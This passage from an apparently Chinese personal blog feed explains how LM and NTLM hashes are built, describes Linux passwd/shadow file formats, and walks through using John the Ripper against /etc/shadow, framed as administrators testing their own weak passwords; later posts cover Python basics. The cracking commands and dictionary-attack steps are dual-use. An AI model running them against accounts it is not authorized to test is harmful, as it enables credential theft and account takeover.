        <content type="html"><![CDATA[<h1 id="Windows系统密码破解"><a href="#Windows系统密码破解" class="headerlink" title="Windows系统密码破解"></a>Windows系统密码破解</h1><h2 id="LM-算法"><a href="#LM-算法" class="headerlink" title="LM**算法**"></a><strong>LM**</strong>算法**</h2><p> 假设明文口令是“Welcome”，首先全部转换成大写“WELCOME”，再将口令字符串大写转写后的字符串变换成二进制串：</p><p>“WELCOME” 57454C434F4D4500000000000000</p><p>技巧：可以将明文口令复制到UltraEdit编辑器中使用二进制方式查看即可获取口令的二进制串。</p><a id="more"></a><p>说明：如果明文口令经过大写变换后的二进制字符串不足14字节，则需要在其后添加0x00补足14字节。</p><p>然后切割成两组7字节的数据，分别经str_to_key（）函数处理得到两组8字节数据：</p><p>57454C434F4D45 -str_to_key()56A25288347A348A</p><p>00000000000000 -str_to_key()0000000000000000</p><p>这两组8字节数据将做为DESKEY对魔术字符串“KGS!@#$%”进行标准DES加密。</p><p>“KGS!@#$%” 4B47532140232425</p><p>56A25288347A348A -对4B47532140232425进行标准DES加密 C23413A8A1E7665F</p><p>0000000000000000 -对4B47532140232425进行标准DES加密 AAD3B435B51404EE</p><p>将加密后的这两组数据简单拼接，就得到了最后的LM Hash</p><p>LM Hash: C23413A8A1E7665FAAD3B435B51404EE 。</p><h2 id="NTLM-算法"><a href="#NTLM-算法" class="headerlink" title="NTLM**算法**"></a><strong>NTLM**</strong>算法**</h2><p>从IBM设计的LM Hash算法存在几个弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash应运而生。假设明文口令是“123456”，首先转换成Unicode</p><p>字符串，与LM Hash算法不同，这次不需要添加0x00补足14字节</p><p>“123456”  310032003300340035003600</p><p>从ASCII串转换成Unicode串时，使用little-endian序，微软在设计整个SMB协议时就没考虑过big-endian序，ntoh<em>()、hton</em>()函数不宜用在SMB报文解码中。0x80之前的标准ASCII码转换成Unicode码，就是简单地从0x??变成0x00??。此类标准ASCII串按little-endian序转换成Unicode串，就是简单地在原有每个字节之后添加0x00。对所获取的Unicode串进行标准MD4单向哈希，无论数据源有多少字节，MD4固定产生128-bit的哈希值，16字节进行标准MD4单向哈希:</p><p>310032003300340035003600 32ED87BDB5FDC5E9CBA88547376818D4</p><p>就得到了最后的NTLM Hash</p><p>NTLM Hash: 32ED87BDB5FDC5E9CBA88547376818D4</p><p>与LM Hash算法相比，明文口令大小写敏感，无法根据NTLM Hash判断原始明文口令是否小于8字节，摆脱了魔术字符串”KGS!@#$%”。MD4是真正的单向哈希函数，穷举作为数据源出现的明文，难度较大。</p>]]></content>
      
      
      
        <tags>
            
            <tag> crypt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux系统密码</title>
      <link href="/2019/12/15/linux%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/"/>
      <url>/2019/12/15/linux%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux系统–密码加密机制"><a href="#Linux系统–密码加密机制" class="headerlink" title="Linux系统–密码加密机制"></a>Linux系统–密码加密机制</h1><p>  Linux通过加密算法（Encryption Algorithm）来产生加密后的密码数据。</p><p>  目前的 Linux 提供下面两种加密算法：MD5和DES。MD5是Linux默认的加密机制，是Red Hat Enterprise Linux建议使用的加密算法，支持 255 个字符的密码数据，安全性高出DES。</p><p>  DES是传统 UNIX 使用的加密算法，只能支持八个字符内的密码数据，如果密码超过八个字符，DES 会忽略第八个字符以后的密码，其安全性会相对比较差。</p><p>  DES与MD5都只是单向式哈希算法（One Way Hash Algorithms）。</p><a id="more"></a><h2 id="MD5-加密算法"><a href="#MD5-加密算法" class="headerlink" title="MD5**加密算法**"></a><strong>MD5**</strong>加密算法**</h2><p>  MD5将任意长度的“字节串”映射为一个128bit的大整数。</p><p>  例如：我们将字符串“aaa”经过MD5运算后结果为：47BCE5C74F589F4867DBD57E9CA9F808，因为MD5算法的不可逆性，不可能根据这些信息回逆字符串“aaa”，因此，密码是安全的。MD5算法可以叙述为：MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过一系列的处理后，算法的输出由4个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p><h2 id="DES-加密算法"><a href="#DES-加密算法" class="headerlink" title="DES**加密算法**"></a><strong>DES**</strong>加密算法**</h2><p>  DES是一个对称算法：加密和解密用的是同一算法（除密钥编排不同以外），既可用于加密又可用于解密。它的核心技术是：在相信复杂函数可以通过简单函数迭代若干圈得到的原则下，利用F函数及对合等运算，充分利用非线性运算。DES以64位为分组对数据加密。每组64位，最后一组若不足64位，以“0”补齐。密钥通常表示为64位的数，但每个第8位都用作奇偶校验，可以忽略，所以密钥的长度为56位，密钥可以是任意的56位的数，且可在任意的时候改变。其中极少量的数被认为是弱密钥，但能容易地避开它们，所有的保密性依赖于密钥。DES 对 64 位的明文分组进行操作。通过一个初始置换，将明文分组分成左半部分（L0）和右半部分（R0），各32位长。R0与子密钥K1进行F函数的运算，输出32位的数，然后与L0执行异或操作得到R1，L1 则是上一轮的 R0，如此经过 16 轮后，左、右半部分合在一起，经过一个末置换（初始置换的逆置换），这样该算法就完成了。</p><h2 id="Linux-密码文件"><a href="#Linux-密码文件" class="headerlink" title="Linux**密码文件**"></a><strong>Linux**</strong>密码文件**</h2><p>​    几乎所有的Linux操作系统的密码文件格式都雷同，由于Linux使用不可逆的加密算法来加密密码，因此从密文是得不到明文的。传统的存放用户账号及密码信息的文件为/etc/passwd，但由于该文件为全局可读的，加密的算法是公开的，恶意用户可以窃取该文件，穷举出所有可能的明文并通过相同的算法计算出密文进行比较直到相同，以破解密码口令。针对这种安全问题，Linux普遍采用了“shadow”机制，将加密的口令转移到/etc/shadow文件里，该文件只为root超级用户可读，而同时/etc/passwd文件的密文域显示为一个x，从而最大限度减少密文泄露的机会。</p><p>总之，Linux操作系统采用了UNIX传统的方法，把全部的用户信息保存为普通的文本文件。用户可以通过对这些文件进行修改来管理用户和组。</p><p>用户账号文件——passwd</p><p>/etc/passwd文件是UNIX安全的关键文件之一。该文件用于用户登录时校验用户的登录名、加密的口令数据项、用户ID(UID)、默认的用户分组ID(GID)、用户信息、用户登录子目录以及登录后使用的shell。这个文件的每一行保存一个用户的资料，而用户资料的每一个数据项采用冒号“:”分隔。如下所示：</p><p>LOGNAME:PASSWORD:UID:GID:USERINFO:HOME:SHELL</p><p>每行的头两项是登录名和加密后的口令，后面的两个数是UID和GID，接着的一项是系统管理员想写入的有关该用户的任何信息，最后两项是两个路径名：一个是分配给用户的HOME目录，另一个是用户登录后将执行的shell(若为空格则默认为/bin/sh)。</p><p>下面是一个实际的系统用户的例子：</p><p>cracker:x:6018: 6018: cracker:/home/ cracker:/bin/bash</p><p>该用户的基本信息为：</p><p>登录名：cracker</p><p>加密的口令表示：x</p><p>UID：6018</p><p>GID：6018</p><p>用户信息：cracker</p><p>HOME目录：/home/ cracker</p><p>登录后执行的shell：/bin/bash</p><p>用户的登录名是用户用来登录的识别，由用户自行选定，主要由方便用户记忆或者具有一定含义的字符串组成。</p><p>所有用户的口令的存放都是加密的，通常采用的是不可逆的加密算法，比如DES(Data Encryption Standard，数据加密标准)。当用户在登录提示符处输入它们的口令时，输入的口令将由系统进行加密。再把加密后的数据与机器中用户的口令数据项进行比较。如果这两个加密数据匹配，就可以让这个用户进入系统。在/etc/passwd文件中，UID信息也很重要。系统使用UID而不是登录名区别用户。一般来说，用户的UID应当是独一无二的，其他用户不应当有相同的UID数值，只有UID等于0时可以例外。任何拥有0值UID的用户都具有根用户(系统管理员)访问权限，因此具备对系统的完全控制。通常，UID为0这个特殊值的用户的登录名是“root”。根据惯例，从0到99的UID保留用做系统用户的UID。如果在/etc/passwd文件中有两个不同的入口项有相同的UID，则这两个用户对文件具有相同的存取权限。</p><p>每一个用户都需要有地方保存专属于自己的配置文件。这需要让用户工作在自己定制的操作环境中，以免改变其他用户定制的操作环境，这个地方就叫做用户登录子目录。在这个子目录中，用户不仅可以保存自己的配置文件，还可以保存自己日常工作用到的各种文件。出于一致性的考虑，大多数站点都从/home开始安排用户登录子目录，并把每个用户的子目录命名为其上机使用的登录名。</p><p>当用户登录进入系统时，都有一个属于自己的操作环境。用户遇到的第一个程序叫做shell。在Linux系统里，大多数shell都是基于文本的。Linux操作系统带有好几种shell供用户选用。用户可以在/etc/shells文件中看到它们中的绝大多数。用户可以根据自己的喜好来选用不同的shell进行操作。按照最严格的定义，在上面所介绍的/etc/passwd文件中，每个用户的口令数据项中并没有定义需要运行某个特定的shell，其中列出的是这个用户上机后第一个运行的程序是哪个。综上所述，通过使用cat命令查看/etc/passwd文件(#cat /etc/passwd)。</p><p>用户影子文件——shadow</p><p>Linux使用不可逆的加密算法如DES来加密口令，由于加密算法是不可逆的，所以黑客从密文是得不到明文的。但/etc/passwd文件是全局可读的，加密的算法是公开的，恶意用户取得了/etc/passwd文件，便极有可能破解口令。而且，在计算机性能日益提高的今天，对账号文件进行字典攻击的成功率会越来越高，速度越来越快。因此，针对这种安全问题，Linux/UNIX广泛采用了“shadow(影子)文件”机制，将加密的口令转移到/etc/shadow文件里，该文件只为root超级用户可读，而同时/etc/passwd文件的密文域显示为一个x，从而最大限度地减少了密文泄露的机会。</p><p>/etc/shadow文件的每行是8个冒号分割的9个域，格式如下：</p><p>username: passwd: lastchg: min: max: warn: inactive: expire: flag</p><p>如下所示的是一个系统中实际影子文件的例子：</p><p>liyang:$1$ciY58zQZ$iKVHLSVZZgM75.lGp5Rmv.:14633:0:99999:7:::</p><p>我们对最后一个用户的信息进行解释，该信息表明了如下含义：</p><p>用户登录名：liyang</p><p>用户加密的口令：liyang后紧跟的一段乱码信息$1$ciY58zQZ$iKVHLSVZZgM75.lGp5Rmv.</p><p>从1970年1月1日起到上次修改口令所经过的天数天数为：14633天</p><p>需要多少天才能修改这个命令：0天</p><p>该口令永不过期：采用99999表示</p><p>要在口令失效前7天通知用户，发出警告</p><p>禁止登录前用户名还有效的天数未定义，以“:”表示</p><p>用户被禁止登录的时间未定义，以“:”表示</p><p>保留域，未使用，以“:”表示</p><p>组账号文件——group</p><p>/etc/passwd文件中包含着每个用户默认的分组ID(GID)。在/etc/group文件中，这个GID被映射到该用户分组的名称以及同一分组中的其他成员去。</p><p>/etc/group文件含有关于小组的信息，/etc/passwd中的每个GID在文件中应当有相应的入口项，入口项中列出了小组名和小组中的用户，这样可方便地了解每个小组的用户，否则必须根据GID在/etc/passwd文件中从头至尾地寻找同组用户，这提供了一个比较快捷的寻找途径。/etc/group文件对小组的许可权限的控制并不是必要的，因为系统用来自于/etc/passwd文件的UID、GID来决定文件存取权限，即使/etc/group文件不存在于系统中，具有相同的GID用户也可以小组的存取许可权限共享文件。小组就像登录用户一样可以有口令。如果/etc/group文件入口项的第二个域为非空(通常用x表示)，则将被认为是加密口令。/etc/group文件中每一行的内容如下所示：</p><p>用户分组名</p><p>加过密的用户分组口令</p><p>用户分组ID号(GID)</p><p>以逗号分隔的成员用户清单</p><p>如下是系统中一个具体的/etc/group文件中记录的例子：</p><p>adm:x:4:root,adm,daemon</p><p>以上面文件第四行为例子，它说明在系统存在一个adm的用户组，它的信息如下：</p><p>用户分组名为adm</p><p>用户组口令已经加密，用“x”表示</p><p>GID为4</p><p>同组的成员用户有：root，adm，daemon</p><p>组账号文件——gshadow</p><p>如同用户账号文件的作用一样，组账号文件也是为了加强组口令的安全性，防止黑客对其实行的暴力攻击，而采用的一种将组口令与组的其他信息相分离的安全机制。其格式如下所示内容：</p><p>用户组名</p><p>加密的组口令</p><p>组成员列表</p><p>下面是系统中一个具体的/etc/gshadow文件的例子：</p><p>mail:::mail,postfix,exim</p><p>以组mail为例，其加密后的组口令被隐藏，其组成员包括mail、postfix和exim。其他的以“::”结尾的组表明没有组成员，但是用户可以自行添加。</p><p>John the Ripper工具简介</p><p>John the Ripper是一个工具软件，用于在已知密文的情况下尝试破解出明文的破解密码软件。目前的最新版本是JOHN1.7版，主要支持对DES、MD5两种加密方式的密文进行破解工作。它可以工作于多中不同的机型以及多种不同的操作系统之下，包括：Linux x86、freeBSD、x86、Solaris、SPARC、OSF/1 Alpha、DOS、WinNT/WinXP系列等。</p><p>John the Ripper 1.7是目前比较好的破解密码工具，在解密过程中会自动定时存盘，用户可以强迫中断解密过程（使用ctrl+c组合键），下次还可以从中断的地方继续进行下去（john-restore命令）。任何时候敲击键盘，用户都可以看到整个解密的进行情况，所有已经被破解的密码会被保存在当前目录下的JOHN.POT文件中，SHADOW中所有密文相同的用户会被归成一类，这样JOHN就不会进行无谓的重复劳动了。在程序的设计中，关键的密码生成的条件被放在JOHN.INI文件中，用户可以自行修改设置，不仅支持单词类型的变化，而且支持自己编写C的小程序限制密码的取值方式。</p><p>在使用该软件前，我们可以从网上下载其最新版本john-1.7.3.4 for Linux版本，它包含DOC、SRC和RUN三个目录，在SRC目录下，在机器上执行如下命令即可：</p><p>#make</p><p>#make clean linux-x86-any</p><p>安装好后，可以切换到RUN目录下，进行测试，如下所示：</p><p>#cd ../run</p><p>#./john –test</p><p>John the ripper提供了如下多达10余种的命令，供用户选择使用：</p><p>pwfile:[,..]：用于指定存放密文所在的文件名，（可以输入多个，文件名用“，”分隔，也可以使用*或者 这两个通配符引用一批文件）。也可以不使用此参数，将文件名放在命令行的最后即可。</p><p>wordfile:&lt;字典文件名&gt;-stdin：指定的用于解密用的字典文件名。也可以使用STDIO来输入，就是在键盘中输入。</p><p>rules：在解密过程中使用单词规则变化功能。如将尝试cool单词的其他可能，如COOLER、Cool等，详细规则可以在JOHN.INI文件中的[List.Rules:Wordlist]部分查到。</p><p>incremental[:&lt;模式名称&gt;]：使用遍历模式，就是组合密码的所有可能情况，同样可以在JOHN.INI文件中的[Incremental:*****]部分查到。</p><p>single：使用单一模式进行解密，主要是根据用户名产生变化来猜测解密，可以消灭比较低级的用户。其组合规则可以在JOHN.INI文件中的[List.Rules:Single]部分查到，我们在下面详细解释。</p><p>external:&lt;模式名称&gt;：使用自定义的扩展解密模式,用户可以在john.ini中定义自己需要的密码组合方式。JOHN也在INI文件中给出了几个示例，在INI文件的[List.External:<strong>**</strong>]中所定义的自订破解功能。</p><p>restore[:&lt;文件名&gt;]：继续上次的破解工作，JOHN被中断后，当前的解密进度情况被存放在RESTORE文件中，用户可以拷贝这个文件到一个新的文件中。如果参数后不带文件名，JOHN默认使用RESTORE文件。</p><p>makechars:&lt;文件名&gt;：制作一个字符表,用户所指定的文件如果存在，则将会被覆盖。JOHN尝试使用内在规则在相应密钥空间中生成一个最有可能击中的密码组合，它会参考在JOHN.POT文件中已经存在的密钥。</p><p>show：显示已经破解出的密码，因为JOHN.POT文件中并不包含用户名，同时用户应该输入相应的包含密码的文件名，JOHN会输出已经被解密的用户连同密码的详细表格。</p><p>test：测试当前机器运行JOHN的解密速度，需要1分钟，它会得出在当前的情况下解密的各种可能情况下相应的解密速度，如同时解密100个用户时的平均速度，使用 遍历法解密模式时解密的速度。salts指用户个数，如果给出的对于100个用户解密的平均速度为18000次/秒，那么表明同时对100个用户解密，解 密的速度为每个180次/秒。因为绝大多数的时间被用于密钥比较过程中了。所以应该对用户进行挑选。</p><p>users:[,..]：只破解某类型的用户或者属于某个组的用户。如果得到的PASSWD文件没有包含密文，那么在得到SHADOW后应该进行组合，JOHN的附带程序 UNSHADOW.EXE可以完成这一过程，当然了，用户也可以手工做。一般的能够进入CSH的用户都是解密的首选对象。也可以要UID=0的ROOT级别 的用户。</p><p>shells:[!][,..]：和上面的参数一样，这一选项可以选择对所有可以使用shell的用户进行解密，对其他用户不予理睬。“!”就是表示不要某些类型的用户。例如：“-shells：csh”。</p><p>timeout:&lt;几分钟&gt;：指定解密持续的时间是几分钟，到时间JOHN自动停止运行。</p><p>beep-quiet：当解密出密码时是否要让PC喇叭叫一下，以提醒用户。</p><p>noname-nohash：不使用内存来保存“用户名”等内容。</p><p>des-md5：指定使用的解密方式是解DES还是MD5，对于解密DES密码不用理会这一选项。</p><p>除了口令破解程序之外，在这个软件包中，还包含了其他几个实用工具，它们对于实现口令破解都有一定的帮助，这些工具都放置在run目录下，下面分别予以简要介绍。</p><p>(1)unshadow PASSWORD-FILE SHADOW-FILE</p><p>unshadow命令将passwd文件和shadow文件组合在一起，其结果用于John破解程序。通常应该使用重定向方法将这个程序的结果保存在文件中，之后将文件传递给John破解程序。</p><p>(2)unafs DATABASE-FILE CELL-NAME</p><p>unafs从二进制AFS数据库中提取口令散列值，并生成John可用的输出，通常应该把这个输出重定向到文件中。</p><p>(3)unique OUTPUT-FILE</p><p>删除字典表中的重复词汇，但不改变字典表中各词条项的顺序。</p><p>安装好后，我们可以灵活使用如下几种方式来对自己的账户密码进行测试：</p><p>通常情况下，许多用户的密码命名方式非常简单，比如foo、hello、world等等，或者很多都是与用户名相同的密码口令，那么我们一般可以先采用简单解密方式来对系统中的密码进行简单的初步试探，如果发现能够成功破解，那么就需要对这些密码口令的强度进行加强，如下所示：</p><p>#./john –single “/etc/shadow”</p><p>Loaded 2 password hashes with 3 different salts (FreeBSD MD5 [32/32])</p><p>liyang (liyang)</p><p>guesses: 1 time: 0:00:00:00 100% c/s: 6975 trying: 999991900</p><p>在上述命令中，我们发现系统存在一个liyang用户，其用户名和密码均为liyang，因而通过最简单的方式便能将其发现和利用，如果为黑客破解则将造成不可设想的后果，因而我们的用户应该立即根据此种情况进行口令加强。</p><p>其次，用户可以使用字典文件来对系统用户的恶密码强度进行试探和测试。人们常用hello、superman、cooler、asdfgh、123456等作为自己的密码。而-rules参数则在此基础上再加上些变化，如字典中有单词cool，则JOHN还会尝试使用cooler、CoOl、Cool等单词变化进行解密。一般视SHADOW中的用户多少及用户的字典大小、用户的机器速度，解密时间从几小时到几天不等。下面给出使用该方式进行解密的例子，假设我们已经生成了一个password.lst文件，其中包含了常用的以字典单词为依据的密码，那么我们对系统中的用户密码使用该方式进行试探破解，由于字典中保留了young这样一个单词，因而用户google的密码所以也被试探出来，网络管理员同样需要对该密码进行加固，比如添加适当的后缀、字母和数字等：</p><p># ./john –wordlist=password.lst “/etc/shadow”Loaded 2 password hashes with 2 different salts (FreeBSD MD5 [32/32])young (google)guesses: 1 time: 0:00:00:01 100% c/s: 3571 trying: zhongguo</p>]]></content>
      
      
      
        <tags>
            
            <tag> -linux -crypt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python--day2</title>
      <link href="/2019/12/15/python2/"/>
      <url>/2019/12/15/python2/</url>
      
        <content type="html"><![CDATA[<h1 id="day2–python实现DES加解密"><a href="#day2–python实现DES加解密" class="headerlink" title="day2–python实现DES加解密"></a>day2–python实现DES加解密</h1>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python--day1</title>
      <link href="/2019/12/12/python/"/>
      <url>/2019/12/12/python/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-day1"><a href="#Python-day1" class="headerlink" title="Python-day1"></a>Python-day1</h1><p>中文# -<em>- coding: UTF-8 -</em>-；</p><p><em>Python3.X 源码文件默认使用utf-8编码，所以可以正常解析中文，无需指定 UTF-8 编码。</em></p><p>单下划线开头 <strong>_foo</strong> 的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用 <strong>from xxx import *</strong> 而导入</p><p><strong>__foo</strong> 代表类的私有成员，以双下划线开头和结尾的 <strong><strong>foo</strong></strong> 代表 Python 里特殊方法专用的标识，如 <strong><strong>init</strong>()</strong> 代表类的构造函数。</p><p>Python 可以同一行显示多条语句，方法是用分号 <strong>;</strong> 分开，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> (<span class="string">'hello'</span>);<span class="keyword">print</span> (<span class="string">'runoob'</span>);</span><br><span class="line">hello</span><br><span class="line">runoob</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/Q6YB7R" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/12/Q6YB7R.md.png" alt="Q6YB7R.md.png"></a></p><a id="more"></a><p>python 最具特色的就是用缩进来写模块。</p><p>缩进的空白数量是可变的，但是所有代码块语句必须包含相同的缩进空白数量，这个必须严格执行。</p><p>但是我们可以使用斜杠（ \）将一行的语句分为多行显示，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">total = item_one + \</span><br><span class="line">        item_two + \</span><br><span class="line">        item_three</span><br></pre></td></tr></table></figure><h5 id="Python注释"><a href="#Python注释" class="headerlink" title="Python注释"></a><strong>Python注释</strong></h5><p>python中单行注释采用 # 开头。</p><p>python 中多行注释使用三个单引号(‘’’)或三个双引号(“””)。</p><p>空行的作用在于分隔两段不同功能或含义的代码，便于日后代码的维护或重构。</p><p>记住：空行也是程序代码的一部分。</p><h4 id="print-输出"><a href="#print-输出" class="headerlink" title="print 输出"></a>print 输出</h4><p>print 默认输出是换行的，如果要实现不换行需要在变量末尾加上逗号 <strong>,</strong>。</p><h5 id="命令行调入-py文件"><a href="#命令行调入-py文件" class="headerlink" title="命令行调入.py文件"></a>命令行调入.py文件</h5><p>cmd 后，直接 &gt;python D:\test.py //拿在D盘的.py文件演示</p><p><img src="https://s2.ax1x.com/2019/12/12/Q66gIO.png" alt="Q66gIO.png"></p><h4 id="等待用户输入"><a href="#等待用户输入" class="headerlink" title="等待用户输入"></a>等待用户输入</h4><p>下面的程序执行后就会等待用户输入，按回车键后就会退出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pip._vendor.distlib.compat <span class="keyword">import</span> raw_input</span><br><span class="line"></span><br><span class="line">print(<span class="string">"x\n"</span>)</span><br><span class="line">raw_input(<span class="string">"按下 enter 键退出，其他任意键显示...\n"</span>)</span><br></pre></td></tr></table></figure><h4 id="看到这里我不觉想了想，为什么不直接学3-8呢，醉了"><a href="#看到这里我不觉想了想，为什么不直接学3-8呢，醉了" class="headerlink" title="看到这里我不觉想了想，为什么不直接学3.8呢，醉了"></a>看到这里我不觉想了想，为什么不直接学3.8呢，醉了</h4><p>Python 3 源码文件以 <strong>UTF-8</strong> 编码，所有字符串都是 unicode 字符串。</p><h4 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h4><ul><li>第一个字符必须是字母表中字母或下划线 <strong>_</strong> 。</li><li>标识符的其他的部分由字母、数字和下划线组成。</li><li>标识符对大小写敏感。</li></ul><p>在 Python 3 中，可以用中文作为变量名，非 ASCII 标识符也是允许的了</p><h4 id="数字-Number-类型"><a href="#数字-Number-类型" class="headerlink" title="数字(Number)类型"></a>数字(Number)类型</h4><p>python中数字有四种类型：整数、布尔型、浮点数和复数。</p><ul><li><strong>int</strong> (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。</li><li><strong>bool</strong> (布尔), 如 True。</li><li><strong>float</strong> (浮点数), 如 1.23、3E-2</li><li><strong>complex</strong> (复数), 如 1 + 2j、 1.1 + 2.2j</li></ul><h4 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">str=<span class="string">'Runoob'</span></span><br><span class="line"> </span><br><span class="line">print(str)                 <span class="comment"># 输出字符串</span></span><br><span class="line">print(str[<span class="number">0</span>:<span class="number">-1</span>])           <span class="comment"># 输出第一个到倒数第二个的所有字符</span></span><br><span class="line">print(str[<span class="number">0</span>])              <span class="comment"># 输出字符串第一个字符</span></span><br><span class="line">print(str[<span class="number">2</span>:<span class="number">5</span>])            <span class="comment"># 输出从第三个开始到第五个的字符</span></span><br><span class="line">print(str[<span class="number">2</span>:])             <span class="comment"># 输出从第三个开始后的所有字符</span></span><br><span class="line">print(str * <span class="number">2</span>)             <span class="comment"># 输出字符串两次</span></span><br><span class="line">print(str + <span class="string">'你好'</span>)        <span class="comment"># 连接字符串</span></span><br><span class="line"> </span><br><span class="line">print(<span class="string">'------------------------------'</span>)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'hello\nrunoob'</span>)      <span class="comment"># 使用反斜杠(\)+n转义特殊字符</span></span><br><span class="line">print(<span class="string">r'hello\nrunoob'</span>)     <span class="comment"># 在字符串前面添加一个 r，表示原始字符串，不会发生转义</span></span><br><span class="line"><span class="keyword">print</span> (str + <span class="string">"TEST"</span>) <span class="comment"># 连接字符串</span></span><br><span class="line">Runoob</span><br><span class="line">Runoo</span><br><span class="line">R</span><br><span class="line">noo</span><br><span class="line">noob</span><br><span class="line">RunoobRunoob</span><br><span class="line">Runoob你好</span><br><span class="line">------------------------------</span><br><span class="line">hello</span><br><span class="line">runoob</span><br><span class="line">hello\nrunoob</span><br></pre></td></tr></table></figure><p><strong>等待用户输入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">input(<span class="string">"\n\n按下 enter 键后退出。"</span>)</span><br></pre></td></tr></table></figure><h4 id="多个语句构成代码组"><a href="#多个语句构成代码组" class="headerlink" title="多个语句构成代码组"></a>多个语句构成代码组</h4><p>缩进相同的一组语句构成一个代码块，我们称之代码组。</p><p>像if、while、def和class这样的复合语句，首行以关键字开始，以冒号( : )结束，该行之后的一行或多行代码构成代码组。</p><p>我们将首行及后面的代码组称为一个子句(clause)。</p><h4 id="Print-输出"><a href="#Print-输出" class="headerlink" title="Print 输出"></a>Print 输出</h4><p>print 默认输出是换行的，如果要实现不换行需要在变量末尾加上 <strong>end=””</strong>：</p><h4 id="import-与-from…import"><a href="#import-与-from…import" class="headerlink" title="import 与 from…import"></a>import 与 from…import</h4><p>在 python 用 <strong>import</strong> 或者 <strong>from…import</strong> 来导入相应的模块。</p><p>将整个模块(somemodule)导入，格式为： <strong>import somemodule</strong></p><p>从某个模块中导入某个函数,格式为： <strong>from somemodule import somefunction</strong></p><p>从某个模块中导入多个函数,格式为： <strong>from somemodule import firstfunc, secondfunc, thirdfunc</strong></p><p><strong>Python3 基本数据类型</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">counter = <span class="number">100</span>          <span class="comment"># 整型变量</span></span><br><span class="line">miles   = <span class="number">1000.0</span>       <span class="comment"># 浮点型变量</span></span><br><span class="line">name    = <span class="string">"runoob"</span>     <span class="comment"># 字符串</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (counter)</span><br><span class="line"><span class="keyword">print</span> (miles)</span><br><span class="line"><span class="keyword">print</span> (name)</span><br></pre></td></tr></table></figure><ul><li>1、Python可以同时为多个变量赋值，如a, b = 1, 2。</li><li>2、一个变量可以通过赋值指向不同类型的对象。</li><li>3、数值的除法包含两个运算符：<strong>/</strong> 返回一个浮点数，<strong>//</strong> 返回一个整数。</li><li>4、在混合计算时，Python会把整型转换成为浮点数。</li></ul><h4 id="List（列表）"><a href="#List（列表）" class="headerlink" title="List（列表）"></a><strong>List（列表）</strong></h4><p>List（列表） 是 Python 中使用最频繁的数据类型。</p><p>列表可以完成大多数集合类的数据结构实现。列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表（所谓嵌套）。</p><p>列表是写在方括号 <strong>[]</strong> 之间、用逗号分隔开的元素列表。</p><p>和字符串一样，列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表。</p><p>列表截取的语法格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量[头下标:尾下标]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古典密码</title>
      <link href="/2019/12/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"/>
      <url>/2019/12/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
      
